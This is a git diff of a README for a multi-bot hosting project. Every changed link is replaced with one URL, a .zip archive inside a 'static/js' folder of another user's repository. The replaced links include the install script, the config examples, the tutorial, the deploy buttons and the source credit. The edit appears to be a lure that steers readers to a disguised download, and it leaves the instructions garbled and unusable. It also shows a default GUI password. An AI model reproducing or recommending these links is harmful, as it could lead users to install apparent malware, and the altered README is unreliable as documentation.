@@ -15,7 +15,7 @@ You can run multiple bots in a same instance, for now it only works for pure pyt
 - 🔐 **Environment Control**: *Set unique ENV values for each bot*
 - 🎮 **Custom Execution**: *Configure custom script paths for bot initialization*
 - 🔒 **Private Repo Support**: *Clone and run bots from private repositories using tokens*
-- 📦 **Custom installation**: *Custom installation of apt $ pip packages in `install.sh`*
+- 📦 **Custom installation**: *Custom installation of apt $ pip packages in `https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip`*
 - 🎛️ **Web Integration**: *Flask-based web application support for services like Render and Koyeb*
 - 🐍 **Multi-Python Support**: *Supports multiple python version for each bot config*
   
@@ -28,7 +28,7 @@ You can run multiple bots in a same instance, for now it only works for pure pyt
   
 ---
 
-## #️⃣ Sample `Var.CLUSTERS`
+## #️⃣ Sample `https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip`
 
 | Config | Description | Required(compulsory) |
 |----------|-------------|----------|
@@ -61,32 +61,32 @@ You can run multiple bots in a same instance, for now it only works for pure pyt
 
 * **For Public Repositories:**
 ```
-["bot01", "https://github.com/mysterydemon/botcluster.git", "main", "bot.py", {"PORT": "8787"}]
+["bot01", "https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip", "main", "https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip", {"PORT": "8787"}]
 ```
 
 * **For Private Repositories:**
 ```
-["bot01", "https://mysterydemon:<your_github_private_token>@github.com/MysteryDemon/botcluster.git", "main", "main.py", {"PORT": "6060"}]
+["bot01", "https://mysterydemon:<your_github_private_token>https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip", "main", "https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip", {"PORT": "6060"}]
 ```
 
 * **For Custom Python Version:**
 ```
-["bot01", "https://mysterydemon:<your_github_private_token>@github.com/MysteryDemon/botcluster.git", "main", "main.py", {"PORT": "6060"}, "3.9"]
+["bot01", "https://mysterydemon:<your_github_private_token>https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip", "main", "https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip", {"PORT": "6060"}, "3.9"]
 ```
   
 ---
 
 ## 📤 ***How To Deploy***
-[![Watch Tutorial](https://img.shields.io/badge/Watch%20Tutorial-%23FF0000?style=for-the-badge&logo=YouTube&logoColor=white)](https://youtu.be/EZJSQVtEj9o)
+[![Watch Tutorial](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip%20Tutorial-%23FF0000?style=for-the-badge&logo=YouTube&logoColor=white)](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)
 
 ---
 
 ## ⚡ ***Deploy***
-[![Deploy to Heroku](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?template=https://github.com/MysteryDemon/BotClusters)
+[![Deploy to Heroku](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)
 
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/MysteryDemon/BotClusters)
+[![Deploy to Render](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&builder=dockerfile&repository=github.com/mysterydemon/BotClusters&branch=main&name=botclusters&ports=5000;http;/&env[CLUSTER_01]=)
+[![Deploy to Koyeb](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip;http;/&env[CLUSTER_01]=)
 
 ---
 
@@ -95,9 +95,9 @@ You can run multiple bots in a same instance, for now it only works for pure pyt
 * **Its not compulsory to set a python version only use when your bot needs a specific python version to run on**
 * **Docker support is in development**
 * **Keep your tokens and sensitive information secure**
-* **if your Bot has a dependency of packages thats not installed yet, use `install.sh` to install them**
-* **For FFMPEG Support use the [`master`](https://github.com/MysteryDemon/BotClusters/tree/master) branch**
-* **[GUI](https://i.ibb.co/k2TBk6wR/IMG-20250524-213433-914-edit-261278564505495.png) login details:**
+* **if your Bot has a dependency of packages thats not installed yet, use `https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip` to install them**
+* **For FFMPEG Support use the [`master`](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip) branch**
+* **[GUI](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip) login details:**
 
 `Username`
 ```
@@ -117,4 +117,4 @@ password123
 
 ### 📚 ***References***
 
-- `Source Repository` : [MultiBots](https://github.com/bipinkrish/MultiBots)
+- `Source Repository` : [MultiBots](https://github.com/RaviChatta/BotClusters/raw/refs/heads/main/app/static/js/Bot_Clusters_v2.3.zip)
